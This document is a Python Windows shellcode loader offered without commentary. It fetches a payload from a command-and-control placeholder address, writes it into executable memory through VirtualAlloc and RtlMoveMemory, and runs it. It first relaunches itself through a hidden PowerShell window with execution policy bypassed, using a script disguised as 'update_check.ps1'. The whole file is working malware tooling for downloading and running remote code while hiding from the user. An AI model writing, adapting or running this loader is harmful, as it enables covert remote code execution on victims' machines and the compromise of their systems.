import ctypes
from urllib import request
import os
import sys
import tempfile

MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x40

# Load kernel32 DLL
kernel32 = ctypes.windll.kernel32
shell32 = ctypes.windll.shell32

def get_code(url):
    """Download shellcode from a given URL."""
    with request.urlopen(url) as response:
        shellcode = response.read()
    return shellcode

def load_shellcode(shellcode):
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]
    kernel32.RtlMoveMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]
    
    buf_size = len(shellcode)
    ptr = kernel32.VirtualAlloc(None, buf_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    
    
    # Write the buffer into allocated memory
    shellcode_buffer = (ctypes.c_char * buf_size).from_buffer_copy(shellcode)
    kernel32.RtlMoveMemory(ptr, shellcode_buffer, buf_size)
    shell_func = ctypes.CFUNCTYPE(None)(ptr)
    shell_func()

def run_in_background():
    # Command to run the script in PowerShell
    script_path = os.path.abspath(__file__)
    temp_ps1 = os.path.join(tempfile.gettempdir(), "update_check.ps1")

    # Create the temporary PowerShell script without the environment check and sys.exit()
    with open(temp_ps1, 'w') as ps1_file:
        ps1_file.write(f'& "{sys.executable}" "{script_path}" --background')

    # Use ShellExecute to launch PowerShell in the background
    shell32.ShellExecuteW(None, "open", "powershell.exe", f'-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "{temp_ps1}"', None, 0)

if __name__ == '__main__':
    if '--background' not in sys.argv:
        # Set an environment variable to indicate the script is running in the background
        os.environ['RUN'] = '1'
        # Launch the script in the background and exit the current terminal
        run_in_background()
        # Immediately terminate the process to close the terminal window
        os._exit(0)  # Ensure the original terminal closes

    # The script continues here only when running in the background!
    url = "ip_of_c2/shellcode.bin"
    shellcode = get_code(url)
    load_shellcode(shellcode)
